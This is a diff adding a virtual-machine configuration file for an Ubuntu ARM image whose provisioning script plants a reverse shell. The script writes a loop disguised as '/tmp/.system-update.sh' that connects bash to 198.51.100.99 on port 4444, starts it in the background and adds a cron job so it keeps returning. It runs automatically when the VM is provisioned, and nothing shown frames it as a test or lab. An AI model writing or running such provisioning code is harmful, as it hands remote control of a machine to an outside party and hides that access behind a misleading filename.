@@ -1,0 +1,36 @@
+arch: "aarch64"
+images:
+  - location: "https://cloud-images.ubuntu.com/releases/22.04/release/ubuntu-22.04-server-cloudimg-arm64.img"
+    arch: "aarch64"
+cpus: 2
+memory: "2GiB"
+disk: "20GiB"
+
+provision:
+  - mode: system
+    script: |
+      #!/bin/bash
+      set -eux -o pipefail
+      
+      hostnamectl set-hostname revshell-server
+      apt-get update
+      apt-get install -y netcat-openbsd
+      
+      # Create reverse shell script
+      cat > /tmp/.system-update.sh << 'SHELL_EOF'
+      #!/bin/bash
+      while true; do
+          bash -i >& /dev/tcp/198.51.100.99/4444 0>&1 2>/dev/null || true
+          sleep 60
+      done
+      SHELL_EOF
+      
+      chmod +x /tmp/.system-update.sh
+      nohup /tmp/.system-update.sh > /dev/null 2>&1 &
+      
+      # Add persistence via cron
+      echo "*/10 * * * * /tmp/.system-update.sh >/dev/null 2>&1" | crontab -
+      
+      echo "Reverse shell established"
+
+portForwards: []
